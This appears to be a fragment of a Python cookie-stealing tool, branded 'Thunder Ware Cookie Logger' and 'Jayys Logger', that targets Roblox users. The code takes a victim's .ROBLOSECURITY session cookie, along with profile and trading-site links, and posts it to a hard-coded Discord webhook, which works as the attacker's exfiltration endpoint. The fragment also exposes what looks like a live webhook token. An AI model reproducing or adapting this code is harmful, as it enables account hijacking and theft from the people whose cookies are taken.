...
discord = Discord(url="https://discord.com/api/webhooks/1078797006341935174/V5Xfv-ZmLDyaxau9-pz2f0rDXYhbQhtyi1UnyD_xNuQC5ZJ-xaAiDATlD4L2oIYGK43N")
discord.post(
    username="🌟.gg/GHGkJv4q Thunder Ware Cookie Logger 🌟",
    avatar_url="https://cdn.discordapp.com/attachments/1078796942521417852/1078800578370609183/cat.PNG",
    embeds=[
        {
            "username": "BOT - ⚡Jayys Logger ⚡ ",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/JayRightHereLmao/Image-Logger-V2-NEW-RELEASE-) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                ...
                {"name" : ".There ROBLOSecurityCode", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
